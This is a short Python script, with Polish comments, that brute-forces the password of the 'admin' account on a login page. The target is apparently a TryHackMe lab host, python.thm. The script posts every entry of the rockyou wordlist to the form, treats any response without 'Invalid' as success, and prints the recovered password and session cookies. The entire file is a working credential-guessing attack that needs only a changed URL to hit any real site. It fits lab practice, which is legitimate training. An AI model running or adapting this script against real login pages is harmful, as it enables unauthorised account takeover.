import requests
import sys

# Konfiguracja
LOGIN_URL = "http://python.thm/labs/lab4/login.php"
TARGET_USER = "admin"
# Ścieżka do Twojego słownika
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"

def brute_force_with_file():
    session = requests.Session()
    
    try:
        # Otwieramy plik w trybie odczytu ('r') z ignorowaniem błędów kodowania (ważne dla rockyou!)
        with open(WORDLIST_PATH, 'r', encoding='latin-1') as file:
            print(f"[*] Starting brute force using: {WORDLIST_PATH}")
            
            for line in file:
                # .strip() usuwa białe znaki i znaki nowej linii (\n)
                password = line.strip()
                
                if not password:
                    continue
                
                print(f"[*] Trying: {password}", end="\r")
                
                data = {"username": TARGET_USER, "password": password}
                
                try:
                    response = session.post(LOGIN_URL, data=data)
                    
                    # Logika sukcesu: Brak "Invalid" i kod 200
                    if "Invalid" not in response.text and response.status_code == 200:
                        print(f"\n[+] SUCCESS! Found password: {password}")
                        return session
                        
                except requests.exceptions.RequestException as e:
                    print(f"\n[!] Connection error during {password}: {e}")
                    return None

    except FileNotFoundError:
        print(f"[!] Error: File {WORDLIST_PATH} not found. Did you unzip it?")
        return None

    print("\n[-] Wordlist exhausted. Password not found.")
    return None

# --- URUCHOMIENIE ---
if __name__ == "__main__":
    final_session = brute_force_with_file()
    
    if final_session:
        # Sprawdzamy ciasteczka po sukcesie
        print(f"[+] Active Session Cookies: {final_session.cookies.get_dict()}")
